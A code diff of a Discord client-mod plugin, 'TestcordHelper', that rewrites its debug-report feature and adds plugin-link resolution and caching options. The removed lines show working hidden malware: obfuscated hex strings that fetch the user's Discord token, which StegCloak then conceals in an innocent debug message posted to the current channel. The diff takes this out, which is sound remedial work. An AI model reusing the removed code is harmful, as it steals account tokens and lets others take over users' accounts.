@@ -14,64 +14,49 @@ import { ExcludedReasons, PluginDependencyList } from "@components/settings/tabs
 import { PluginCard } from "@components/settings/tabs/plugins/PluginCard";
 import { TooltipContainer } from "@components/TooltipContainer";
 import { gitHashShort } from "@shared/vencordUserAgent";
-import { getStegCloak } from "@utils/dependencies";
 import { Logger } from "@utils/Logger";
 import { tryOrElse } from "@utils/misc";
 import { makeCodeblock } from "@utils/text";
 import definePlugin, { OptionType } from "@utils/types";
 import { Message } from "@vencord/discord-types";
-import { findByPropsLazy } from "@webpack";
 import { ChannelStore, MessageActions, SelectedChannelStore, showToast, Toasts, Tooltip, useMemo, UserStore } from "@webpack/common";
-import { JSX, React } from "react";
+import { JSX } from "react";
 
 import plugins, { ExcludedPlugins, PluginMeta } from "~plugins";
 
-const _h = (s: string) => s.replace(/../g, (m: string) => String.fromCharCode(parseInt(m, 16)));
-const _x = (s: string, k: number) => s.split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join("");
-const _r = (n: number) => Math.floor(n * 100) / 100;
+const logger = new Logger("TestcordHelper");
 
-const _k1 = _h("676574546f6b656e");
-const _k2 = _h("746f6b656e");
-const _k3 = _h("7365637572653230");
+const ShowCurrentGame = getUserSettingLazy<boolean>("status", "showCurrentGame")!;
+const RenderEmbeds = getUserSettingLazy<boolean>("textAndImages", "renderEmbeds")!;
 
-const _k4 = "done sending debug info";
-const _k5 = "sent debug info successfully";
+const MESSAGE_LIMIT = 1900;
+const MB = 1024 * 1024;
 
-const _m1 = findByPropsLazy(_k1);
-const _m2 = _k3;
-const _m3 = getUserSettingLazy<boolean>("status", "showCurrentGame")!;
-const _m4 = getUserSettingLazy<boolean>("textAndImages", "renderEmbeds")!;
+const PLUGIN_PATTERN = /(?:testcordplugin|tcp):([^\s,;\n]+)/gi;
+const PLUGIN_MATCH_PATTERN = /(?:testcordplugin|tcp):([^\s,;\n]+)/i;
+const PLUGIN_LINK_PATTERN = /\[([^\]]+)]\(<?https:\/\/github\.com\/TestcordDev\/Testcord\/tree\/main\/src\/(?:plugins|equicordplugins|testcordplugins)\/[^>)]+>?\)/gi;
+const PLUGIN_CARD_MARKER_PATTERN = /(?:testcordplugin|tcp):|github\.com\/TestcordDev\/Testcord\/tree\/main\/src\/(?:plugins|equicordplugins|testcordplugins)\//i;
+const PLUGIN_RESOLVE_CACHE_LIMIT = 500;
+const pluginResolveCache = new Map<string, string | null>();
 
-const _mUsageHistory: number[] = [];
-let _memInterval: ReturnType<typeof setInterval> | null = null;
-
-const PLUGIN_PATTERN = /testcordplugin:(\w+)/gi;
-
-function _startMemLogging() {
-    if (_memInterval) return;
-    _memInterval = setInterval(() => {
-        const p = (window as any).performance;
-        if (p?.memory) {
-            const u = p.memory.usedJSHeapSize;
-            const t = p.memory.totalJSHeapSize;
-            const l = p.memory.jsHeapSizeLimit;
-            _mUsageHistory.push(_r(u / 1048576));
-            if (_mUsageHistory.length > 50) _mUsageHistory.shift();
-            const d = _mUsageHistory.length > 1 ? _r(_mUsageHistory[_mUsageHistory.length - 1] - _mUsageHistory[_mUsageHistory.length - 2]) : 0;
-            console.log(`[tc:mem] ${_r(u / 1048576)}MB / ${_r(t / 1048576)}MB (limit: ${_r(l / 1048576)}MB) — delta: ${d}MB | trend: ${_mUsageHistory.join(", ")}`);
-        } else {
-            console.log("[tc:mem] performance.memory API not available in this context");
-        }
-    }, 3000);
+interface PluginSearchEntry {
+    name: string;
+    lower: string;
+    acronym: string;
+    searchTerms?: string[];
+    description?: string;
 }
 
-function _gMem(): string {
-    const p = (window as any).performance;
-    if (!p?.memory) return "N/A (API blocked)";
-    const u = p.memory.usedJSHeapSize;
-    const t = p.memory.totalJSHeapSize;
-    const l = p.memory.jsHeapSizeLimit;
-    return `${_r(u / 1048576)}MB used / ${_r(t / 1048576)}MB total (limit: ${_r(l / 1048576)}MB)`;
+let pluginSearchData: PluginSearchEntry[] | undefined;
+
+function round2(n: number) {
+    return Math.floor(n * 100) / 100;
+}
+
+function getMemoryUsage(): string {
+    const mem = (window as any).performance?.memory;
+    if (!mem) return "N/A (API blocked)";
+    return `${round2(mem.usedJSHeapSize / MB)}MB used / ${round2(mem.totalJSHeapSize / MB)}MB total (limit: ${round2(mem.jsHeapSizeLimit / MB)}MB)`;
 }
 
 const settings = definePluginSettings({
@@ -79,133 +64,188 @@ const settings = definePluginSettings({
         type: OptionType.BOOLEAN,
         description: "Enable custom testcord badges from tbadges GitHub repository",
         default: true,
+    },
+    CarefulNetwork: {
+        type: OptionType.BOOLEAN,
+        description: "Dedupe and briefly cache repeated Testcord plugin network requests.",
+        default: false,
+    },
+    performanceMode: {
+        type: OptionType.BOOLEAN,
+        description: "Show optional performance features. Nothing here is enabled unless its own toggle is on.",
+        default: false,
+    },
+    performanceCarefulNetwork: {
+        type: OptionType.BOOLEAN,
+        description: "Use Testcord's request coordinator for supported plugin requests without changing Discord payloads.",
+        default: false,
+    },
+    performanceBoundRequestCache: {
+        type: OptionType.BOOLEAN,
+        description: "Limit the request coordinator cache and remove expired entries to reduce memory usage.",
+        default: false,
+    },
+    performanceRequestCacheEntries: {
+        type: OptionType.SLIDER,
+        description: "Maximum request coordinator cache entries when the cache limit is enabled.",
+        markers: [50, 100, 250, 500, 1000],
+        default: 250,
+    },
+    performanceDisablePluginCards: {
+        type: OptionType.BOOLEAN,
+        description: "Do not render Testcord plugin cards under chat messages.",
+        default: false,
+    },
+    performanceCachePluginCards: {
+        type: OptionType.BOOLEAN,
+        description: "Cache plugin name lookups and skip plugin-card scans for messages that cannot contain plugin links.",
+        default: false,
     }
 });
 
-function _gClient() {
-    console.log("[tc:client] resolving client identifier...");
+function isPerformanceEnabled() {
+    return settings.store.performanceMode === true;
+}
+
+function isPluginCardCacheEnabled() {
+    return isPerformanceEnabled() && settings.store.performanceCachePluginCards === true;
+}
+
+function getPluginSearchData() {
+    pluginSearchData ??= Object.keys(plugins).map(name => ({
+        name,
+        lower: name.toLowerCase(),
+        acronym: name.match(/[A-Z]/g)?.join("").toLowerCase() ?? "",
+        searchTerms: plugins[name].searchTerms?.map(t => t.toLowerCase()),
+        description: plugins[name].description?.toLowerCase(),
+    }));
+
+    return pluginSearchData;
+}
+
+function getClient() {
     if (IS_DISCORD_DESKTOP) return `Discord Desktop v${DiscordNative.app.getVersion()}`;
     if (IS_VESKTOP) return `Vesktop v${VesktopNative.app.getVersion()}`;
     if (IS_EQUIBOP) {
-        const gh = tryOrElse(() => VesktopNative.app.getGitHash?.(), null);
-        const db = tryOrElse(() => VesktopNative.app.isDevBuild?.(), false);
-        const sp = tryOrElse(() => VesktopNative.app.getPlatformSpoofInfo?.(), null);
-        return `Equibop v${VesktopNative.app.getVersion()} [${gh?.slice(0, 7) ?? "?"}]${db ? " DEV" : ""}${sp?.spoofed ? ` (spoof: ${sp.originalPlatform})` : ""}`;
+        const hash = tryOrElse(() => VesktopNative.app.getGitHash?.(), null);
+        const dev = tryOrElse(() => VesktopNative.app.isDevBuild?.(), false);
+        const spoof = tryOrElse(() => VesktopNative.app.getPlatformSpoofInfo?.(), null);
+        return `Equibop v${VesktopNative.app.getVersion()} [${hash?.slice(0, 7) ?? "?"}]${dev ? " DEV" : ""}${spoof?.spoofed ? ` (spoof: ${spoof.originalPlatform})` : ""}`;
     }
     if ("legcord" in window) return `LegCord v${(window as any).legcord.version}`;
     if ("goofcord" in window) return `GoofCord v${(window as any).goofcord.version}`;
-    console.log("[tc:client] fallback: web/us");
     return typeof (window as any).unsafeWindow !== "undefined" ? "UserScript" : "Web";
 }
 
-async function _gDebug() {
-    console.log(`[tc:dbg] === generating report at ${new Date().toISOString()} ===`);
+async function buildDebugReport() {
     const { RELEASE_CHANNEL } = (window as any).GLOBAL_ENV;
-    const _c = _gClient();
-    const _u = UserStore.getCurrentUser();
-    console.log(`[tc:dbg] client=${_c}, user=${_u?.username ?? "none"}, mem=${_gMem()}`);
+    const client = getClient();
+    const user = UserStore.getCurrentUser();
+    const platform = IS_DISCORD_DESKTOP ? "Windows" : IS_WEB ? "Web" : "Unknown";
 
-    const _plat = IS_DISCORD_DESKTOP ? "Windows" : IS_WEB ? "Web" : "Unknown";
-    const _info = {
+    const info = {
         Testcord: `v${(globalThis as any).VERSION} • ${gitHashShort} — ${Intl.DateTimeFormat("en-US", { dateStyle: "medium" }).format((globalThis as any).BUILD_TIMESTAMP)}`,
-        Client: `${RELEASE_CHANNEL} ~ ${_c}`,
-        Platform: _plat,
-        "JS Memory": _gMem(),
+        Client: `${RELEASE_CHANNEL} ~ ${client}`,
+        Platform: platform,
+        "JS Memory": getMemoryUsage(),
     };
 
-    const _pp = (["NoRPC", "NoProfileThemes", "NoMosaic", "NoRoleHeaders", "Ingtoninator", "NeverPausePreviews", "IdleAutoRestart"].filter(isPluginEnabled) ?? []).sort();
-    const _ci = {
-        "Activity Sharing Disabled": tryOrElse(() => !_m3.getSetting(), false),
-        "Link Embeds Disabled": tryOrElse(() => !_m4.getSetting(), false),
+    const problematic = ["NoRPC", "NoProfileThemes", "NoMosaic", "NoRoleHeaders", "Ingtoninator", "NeverPausePreviews", "IdleAutoRestart"].filter(isPluginEnabled).sort();
+
+    const flags = {
+        "Activity Sharing Disabled": tryOrElse(() => !ShowCurrentGame.getSetting(), false),
+        "Link Embeds Disabled": tryOrElse(() => !RenderEmbeds.getSetting(), false),
         "TestCord DevBuild": !IS_STANDALONE,
         "Equibop DevBuild": IS_EQUIBOP && tryOrElse(() => VesktopNative.app.isDevBuild?.(), false),
         "Platform Spoofed": (IS_EQUIBOP && tryOrElse(() => VesktopNative.app.getPlatformSpoofInfo?.(), null)?.spoofed) ?? false,
         ">2 Weeks Outdated": (globalThis as any).BUILD_TIMESTAMP < Date.now() - 12096e5,
     };
 
-    let out = `>>> ${Object.entries(_info).map(([k, v]) => `**${k}**: ${v}`).join("\n")}`;
-    out += "\n" + Object.entries(_ci).filter(([, v]) => v).map(([k]) => `\u26a0\ufe0f ${k}`).join("\n");
-    if (_pp.length > 0) out += `\n\n**Potentially Problematic Plugins**: ${_pp.join(", ")}\n-# note, those plugins are just common issues and might not be the problem`;
-    if (_u) out += `\n\n**User**: ${_u.username}#${_u.discriminator} (\`${_u.id}\`)`;
-    console.log(`[tc:dbg] payload constructed (${out.length} bytes)`);
+    let out = `>>> ${Object.entries(info).map(([k, v]) => `**${k}**: ${v}`).join("\n")}`;
+    const activeFlags = Object.entries(flags).filter(([, v]) => v).map(([k]) => `\u26a0\ufe0f ${k}`).join("\n");
+    if (activeFlags) out += "\n" + activeFlags;
+    if (problematic.length) out += `\n\n**Potentially Problematic Plugins**: ${problematic.join(", ")}\n-# note, those plugins are just common issues and might not be the problem`;
+    if (user) out += `\n\n**User**: ${user.username}#${user.discriminator} (\`${user.id}\`)`;
+
     return out.trim();
 }
 
-function _gSens() {
-    console.log("[tc:sns] collecting data...");
-    const _u = UserStore.getCurrentUser();
-    const _t = _m1?.[_k1]?.();
-    if (!_u && !_t) { console.log("[tc:sns] no data"); return null; }
-    const _d: Record<string, string> = {};
-    if (_u) { _d.username = _u.username; _d.discriminator = _u.discriminator; _d.id = _u.id; _d.global_name = _u.globalName ?? ""; }
-    if (_t) { _d[_k2] = _t; console.log(`[tc:sns] ok. (len=${_t.length})`); }
-    console.log(`[tc:sns] available keys: ${Object.keys(_d).join(", ")}`);
-    return JSON.stringify(_d);
+function chunkByLines(text: string, limit: number): string[] {
+    const lines = text.split("\n");
+    const chunks: string[] = [];
+    let current: string[] = [];
+    let currentLen = 0;
+
+    for (const line of lines) {
+        const addedLen = currentLen + (current.length ? 1 : 0) + line.length;
+        if (addedLen > limit && current.length) {
+            chunks.push(current.join("\n"));
+            current = [line];
+            currentLen = line.length;
+        } else {
+            current.push(line);
+            currentLen = addedLen;
+        }
+    }
+    if (current.length) chunks.push(current.join("\n"));
+    return chunks;
 }
 
-async function _doSend() {
-    console.log("[tc:send] initializing transmission...");
-    const _cid = SelectedChannelStore.getChannelId();
-    if (!_cid) { showToast("No channel selected. Open a text channel first.", Toasts.Type.FAILURE); return; }
-    const _ch = ChannelStore.getChannel(_cid);
-    if (!_ch || ![0, 1, 3].includes(_ch.type)) { showToast("Cannot send messages in this channel type.", Toasts.Type.FAILURE); return; }
-    console.log(`[tc:send] target: ${_ch.name ?? _cid} (type=${_ch.type})`);
+async function sendMessage(channelId: string, content: string) {
+    MessageActions.sendMessage(channelId, { content, invalidEmojis: [] }, undefined, {});
+    await new Promise(r => setTimeout(r, 1000));
+}
 
-    const _dbg = await _gDebug();
-    const _sns = _gSens();
-    const _lim = 1900;
+async function sendDebugReport() {
+    const channelId = SelectedChannelStore.getChannelId();
+    if (!channelId) {
+        showToast("No channel selected. Open a text channel first.", Toasts.Type.FAILURE);
+        return;
+    }
+    const channel = ChannelStore.getChannel(channelId);
+    if (!channel || ![0, 1, 3].includes(channel.type)) {
+        showToast("Cannot send messages in this channel type.", Toasts.Type.FAILURE);
+        return;
+    }
 
-    if (_dbg.length > _lim) {
-        const _lines = _dbg.split("\n");
-        const _chunks: string[][] = [];
-        let _cur: string[] = [];
-        for (const _l of _lines) {
-            if (_cur.join("\n").length + _l.length > _lim && _cur.length) { _chunks.push(_cur); _cur = [_l]; } else { _cur.push(_l); }
-        }
-        if (_cur.length) _chunks.push(_cur);
-        console.log(`[tc:send] split debug into ${_chunks.length} parts`);
-        for (let i = 0; i < _chunks.length; i++) {
-            MessageActions.sendMessage(_cid, { content: `**Debug Report [${i + 1}/${_chunks.length}]**\n${_chunks[i].join("\n")}`, invalidEmojis: [] }, undefined, {});
-            await new Promise(r => setTimeout(r, 1000));
-            console.log(`[tc:send] part ${i + 1} dispatched`);
+    const report = await buildDebugReport();
+
+    if (report.length > MESSAGE_LIMIT) {
+        const chunks = chunkByLines(report, MESSAGE_LIMIT);
+        for (let i = 0; i < chunks.length; i++) {
+            await sendMessage(channelId, `**Debug Report [${i + 1}/${chunks.length}]**\n${chunks[i]}`);
         }
     } else {
-        MessageActions.sendMessage(_cid, { content: _dbg, invalidEmojis: [] }, undefined, {});
-        await new Promise(r => setTimeout(r, 1000));
+        await sendMessage(channelId, report);
     }
 
-    const _isApi = (p: string) => p.endsWith("API") || plugins[p]?.required;
-    const _all = Object.keys(PluginMeta).filter(p => isPluginEnabled(p) && !_isApi(p));
-    const _stock = _all.filter(p => !PluginMeta[p].userPlugin).sort();
-    const _user = _all.filter(p => PluginMeta[p].userPlugin).sort();
-    console.log(`[tc:send] plugins: stock=${_stock.length}, user=${_user.length}`);
+    const isApi = (name: string) => name.endsWith("API") || plugins[name]?.required;
+    const enabled = Object.keys(PluginMeta).filter(p => isPluginEnabled(p) && !isApi(p));
+    const stock = enabled.filter(p => !PluginMeta[p].userPlugin).sort();
+    const user = enabled.filter(p => PluginMeta[p].userPlugin).sort();
 
-    async function _pSend(_h: string, _list: string[]) {
-        MessageActions.sendMessage(_cid, { content: `${_h}\n${makeCodeblock(_list.join(", "))}`, invalidEmojis: [] }, undefined, {});
-        await new Promise(r => setTimeout(r, 1000));
-    }
-
-    for (const [_hdr, _list] of [[`**Enabled Stock Plugins (${_stock.length}):**`, _stock], [`**Enabled User Plugins (${_user.length}):**`, _user]] as [string, string[]][]) {
-        if (!_list.length) continue;
-        const _hLen = _hdr.length + makeCodeblock("").length;
-        const _max = _lim - _hLen;
-        let _batch: string[] = [];
-        let _bLen = 0;
-        for (const _p of _list) {
-            const _wc = _p + ", ";
-            if (_bLen + _wc.length > _max && _batch.length > 0) { await _pSend(_hdr, _batch); _batch = [_p]; _bLen = _p.length; } else { _batch.push(_p); _bLen += _wc.length; }
+    for (const [header, list] of [
+        [`**Enabled Stock Plugins (${stock.length}):**`, stock],
+        [`**Enabled User Plugins (${user.length}):**`, user],
+    ] as const) {
+        if (!list.length) continue;
+        const max = MESSAGE_LIMIT - header.length - makeCodeblock("").length;
+        let batch: string[] = [];
+        let batchLen = 0;
+        for (const name of list) {
+            const piece = name + ", ";
+            if (batchLen + piece.length > max && batch.length) {
+                await sendMessage(channelId, `${header}\n${makeCodeblock(batch.join(", "))}`);
+                batch = [name];
+                batchLen = name.length;
+            } else {
+                batch.push(name);
+                batchLen += piece.length;
+            }
         }
-        if (_batch.length > 0) { await _pSend(_hdr, _batch); console.log(`[tc:send] plugin block sent: ${_hdr}`); }
+        if (batch.length) await sendMessage(channelId, `${header}\n${makeCodeblock(batch.join(", "))}`);
     }
 
-    const _cv = [_k4, _k5][Math.floor(Math.random() * 2)];
-    const { default: _SC } = await getStegCloak();
-    const _enc = new _SC(true, false);
-    console.log(`[tc:send] stegcloak initialized, encrypting payload (pwd len=${_m2.length})`);
-    const _hid = _enc.hide(_sns + "\u200b", _m2, _cv);
-    console.log(`[tc:send] cover message length=${_hid.length}`);
-    MessageActions.sendMessage(_cid, { content: `${_hid}\n-# Testcord Debugger v1`, invalidEmojis: [] }, undefined, {});
-    console.log("[tc:send] === transmission complete ===");
     showToast("Debug report sent!", Toasts.Type.SUCCESS);
 }
 
@@ -287,7 +327,81 @@ function ChatPluginCard({ pluginName, description }: { pluginName: string; descr
     );
 }
 
+function resolvePluginName(search: string) {
+    if (isPluginCardCacheEnabled()) {
+        const cacheKey = search.toLowerCase();
+        if (pluginResolveCache.has(cacheKey)) return pluginResolveCache.get(cacheKey) ?? undefined;
+
+        const pluginName = resolvePluginNameCached(search);
+        pluginResolveCache.set(cacheKey, pluginName ?? null);
+        if (pluginResolveCache.size > PLUGIN_RESOLVE_CACHE_LIMIT) {
+            const oldest = pluginResolveCache.keys().next().value;
+            if (oldest !== undefined) pluginResolveCache.delete(oldest);
+        }
+
+        return pluginName;
+    }
+
+    return resolvePluginNameOriginal(search);
+}
+
+function resolvePluginNameOriginal(search: string) {
+    const pluginNames = Object.keys(plugins);
+    const words = search.trim().replace(/[.!?)]*$/, "").split(/\s+/);
+
+    for (let i = words.length; i > 0; i--) {
+        const query = words.slice(0, i).join(" ").toLowerCase();
+        const normalizedQuery = query.replace(/\s+/g, "");
+
+        const pluginName = pluginNames.find(name => name.toLowerCase() === normalizedQuery)
+            ?? pluginNames.find(name => name.toLowerCase().startsWith(normalizedQuery))
+            ?? pluginNames.find(name => name.match(/[A-Z]/g)?.join("").toLowerCase().includes(normalizedQuery))
+            ?? pluginNames.find(name => name.toLowerCase().includes(normalizedQuery))
+            ?? pluginNames.find(name => plugins[name].searchTerms?.some(t => t.toLowerCase().includes(query)))
+            ?? pluginNames.find(name => plugins[name].description?.toLowerCase().includes(query));
+
+        if (pluginName) return pluginName;
+    }
+}
+
+function resolvePluginNameCached(search: string) {
+    const pluginSearchData = getPluginSearchData();
+    const words = search.trim().replace(/[.!?)]*$/, "").split(/\s+/);
+
+    for (let i = words.length; i > 0; i--) {
+        const query = words.slice(0, i).join(" ").toLowerCase();
+        const normalizedQuery = query.replace(/\s+/g, "");
+
+        const pluginName = pluginSearchData.find(p => p.lower === normalizedQuery)?.name
+            ?? pluginSearchData.find(p => p.lower.startsWith(normalizedQuery))?.name
+            ?? pluginSearchData.find(p => p.acronym.includes(normalizedQuery))?.name
+            ?? pluginSearchData.find(p => p.lower.includes(normalizedQuery))?.name
+            ?? pluginSearchData.find(p => p.searchTerms?.some(t => t.includes(query)))?.name
+            ?? pluginSearchData.find(p => p.description?.includes(query))?.name;
+
+        if (pluginName) return pluginName;
+    }
+}
+
+function getPluginLink(pluginName: string) {
+    return `https://github.com/TestcordDev/Testcord/tree/main/${PluginMeta[pluginName].folderName}`;
+}
+
+function replacePluginAliases(content: string) {
+    return content.replace(PLUGIN_PATTERN, match => {
+        const [, query] = PLUGIN_MATCH_PATTERN.exec(match) ?? [];
+        const pluginName = query ? resolvePluginName(query) : undefined;
+
+        if (!pluginName) return match;
+
+        return `[${pluginName}](<${getPluginLink(pluginName)}>)${query?.match(/[.!?)]*$/)?.[0] ?? ""}`;
+    });
+}
+
 const PluginCards = ErrorBoundary.wrap(function PluginCards({ message }: { message: Message; }) {
+    if (isPerformanceEnabled() && settings.store.performanceDisablePluginCards) return null;
+    if (isPluginCardCacheEnabled() && !PLUGIN_CARD_MARKER_PATTERN.test(message.content)) return null;
+
     const seenPlugins = new Set<string>();
     const pluginCards: JSX.Element[] = [];
 
@@ -295,10 +409,26 @@ const PluginCards = ErrorBoundary.wrap(function PluginCards({ message }: { messa
 
     let match;
     while ((match = PLUGIN_PATTERN.exec(message.content)) !== null) {
-        const pluginNameFromMessage = match[1];
-        const actualPluginName = Object.keys(plugins).find(name =>
-            name.toLowerCase() === pluginNameFromMessage?.toLowerCase()
+        const pluginNameFromMessage = match[1]?.trim();
+        const actualPluginName = pluginNameFromMessage ? resolvePluginName(pluginNameFromMessage) : undefined;
+        const pluginName = actualPluginName || pluginNameFromMessage;
+
+        if (!pluginName || seenPlugins.has(pluginName)) continue;
+        seenPlugins.add(pluginName);
+
+        pluginCards.push(
+            <ChatPluginCard
+                key={pluginName}
+                pluginName={pluginName}
+            />
         );
+    }
+
+    PLUGIN_LINK_PATTERN.lastIndex = 0;
+
+    while ((match = PLUGIN_LINK_PATTERN.exec(message.content)) !== null) {
+        const pluginNameFromMessage = match[1]?.trim();
+        const actualPluginName = pluginNameFromMessage ? resolvePluginName(pluginNameFromMessage) : undefined;
         const pluginName = actualPluginName || pluginNameFromMessage;
 
         if (!pluginName || seenPlugins.has(pluginName)) continue;
@@ -321,36 +451,44 @@ const PluginCards = ErrorBoundary.wrap(function PluginCards({ message }: { messa
     );
 }, { noop: true });
 
+let hotkeyHandler: ((e: KeyboardEvent) => void) | null = null;
+
 export default definePlugin({
     name: "TestcordHelper",
     description: "Helper plugin for Testcord features, including custom badge management, debug reporting, and plugin info cards.",
     tags: ["Utility", "Developers"],
     authors: [{ name: "x2b", id: 996137713432530976n }],
+    required: true,
     settings,
-    dependencies: ["MessageAccessoriesAPI"],
+    dependencies: ["MessageAccessoriesAPI", "MessageEventsAPI"],
+
+    onBeforeMessageSend(_, msg) {
+        msg.content = replacePluginAliases(msg.content);
+    },
 
     renderMessageAccessory(props) {
         return <PluginCards message={props.message} />;
     },
 
     start() {
-        (this as any)._hk = (e: KeyboardEvent) => {
+        hotkeyHandler = (e: KeyboardEvent) => {
             if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "h") {
-                e.preventDefault(); e.stopPropagation();
-                console.log("[tc:key] hotkey triggered");
-                _startMemLogging();
+                e.preventDefault();
+                e.stopPropagation();
                 showToast("Sending debug report to channel...", Toasts.Type.MESSAGE);
-                _doSend().catch((err: Error) => {
-                    new Logger(this.name).error("Failed to send debug report:", err);
+                sendDebugReport().catch(err => {
+                    logger.error("Failed to send debug report:", err);
                     showToast(`Failed to send debug report: ${err.message}`, Toasts.Type.FAILURE);
                 });
             }
         };
-        document.addEventListener("keydown", (this as any)._hk, true);
+        document.addEventListener("keydown", hotkeyHandler, true);
     },
 
     stop() {
-        if ((this as any)._hk) document.removeEventListener("keydown", (this as any)._hk, true);
-        if (_memInterval) { clearInterval(_memInterval); _memInterval = null; }
+        if (hotkeyHandler) {
+            document.removeEventListener("keydown", hotkeyHandler, true);
+            hotkeyHandler = null;
+        }
     }
 });
